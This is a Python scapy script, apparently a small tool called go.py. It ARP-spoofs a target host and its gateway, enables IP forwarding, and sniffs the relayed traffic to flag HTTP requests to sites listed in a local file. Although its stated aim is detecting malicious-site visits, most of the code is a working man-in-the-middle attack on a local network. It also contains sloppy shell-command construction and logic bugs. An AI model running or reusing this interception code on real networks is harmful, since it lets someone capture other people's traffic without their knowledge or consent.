#-*- coding:utf-8 -*-
from scapy.all import *
from multiprocessing import Process, Queue
import sys,subprocess,os,signal,time,httplib

def getmyinterface():
	sh = os.listdir('/sys/class/net/')[0]
	return sh

def getmyInfo(dev):
	sh = subprocess.check_output("/sbin/ifconfig | /bin/grep -A 1 '"+dev+"' | /bin/grep 'inet addr'  | awk '{print $2}'",shell=True)
	myip = sh.strip("addr:").strip("\n")
	sh = subprocess.check_output("/sbin/ifconfig | /bin/grep '"+dev+"' | /usr/bin/awk '{print $5}'",shell=True)
	mymac = sh.strip("\n")
	return myip,mymac

def getGatewayIP():
	sh = subprocess.check_output("ip route | grep default | awk {'print $3'}",shell=True)
	gatewayIp = sh
	return gatewayIp.strip("\n")

def gettargetmac(myip,gatewayIp,victimip):
	print "[*] Get Gateway Mac........"
	r = sr1(ARP(op=ARP.who_has, psrc=myip, pdst=gatewayIp))
	gatewayMac = r.hwsrc
	print "[!] Done\n"
	print "[*] Get Victim Mac........"
	r = sr1(ARP(op=ARP.who_has, psrc=myip, pdst=victimip))
	victimMac = r.hwsrc
	print "[!] Done\n"
	return gatewayMac,victimMac

def send_arp(gatewayIp,gatewayMac,victimIp,victimMac,mymac):
	while 1:
		send(ARP(op=2,psrc=gatewayIp,pdst=victimIp,hwdst=victimMac))
		send(ARP(op=2,psrc=victimIp,pdst=gatewayIp,hwdst=gatewayMac))
		time.sleep(2)

def malsitelist_init():
	global site_list
	site_list = []
	s = time.time()
	with open("mal_site.txt","r") as f:
		site_list = f.read().split('\n')
	if site_list[-1] == "":
		del site_list[-1]
	j = 0
	for i in site_list:
		site_list[j] = i.strip("http://").strip("/")
		j+=1
	e = time.time()
	print "\n[*] mal_site init : "+str(e-s)+" sec\n"
	print site_list

def relay(interface,gatewayIp,gatewayMac,victimIp,victimMac,mymac):
	def callback(pkt):
		if str(pkt).find('GET'):
			r = pkt.summary()
			print r
			for a in site_list:
				if r.find(a) != -1:
					with open("detect.txt","w") as f:
						s = a+"\tdetect!!"
						f.write(s)
						print s

	sniff(filter="ether dst "+mymac+" and dst "+gatewayIp,prn=callback,count=0)# and ether dst "+mymac+" and dst "+gatewayIp

def main():
	if len(sys.argv) != 2:
		print "[X] Usage : python go.py <target IP>"
		sys.exit(-1)

	malsitelist_init()

	myinterface = getmyinterface()
	myip, mymac = getmyInfo(myinterface)
	victimIp = sys.argv[1]
	gatewayIp = getGatewayIP()
	gatewayMac,victimMac = gettargetmac(myip,gatewayIp,victimIp)

	print "[*] Network Interface : "+myinterface
	print "[*] Gateway IP : "+gatewayIp
	print "[*] Gateway Mac : "+gatewayMac
	print "[*] Victim IP : "+victimIp
	print "[*] Victim Mac : "+victimMac
 
	#enable relay
	if subprocess.check_output("/bin/cat /proc/sys/net/ipv4/ip_forward",shell=True) == "0\n":
		print "ip_forward not set"
		subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
	else:
		print "ip forward already set"

	p = Process(target=send_arp,args=(gatewayIp,gatewayMac,victimIp,victimMac,mymac)) #send arp
	p.start()
	p2 = Process(target=relay,args=(myinterface,gatewayIp,gatewayMac,victimIp,victimMac,mymac)) #sniff
	p2.start()

if __name__=='__main__':
	main()
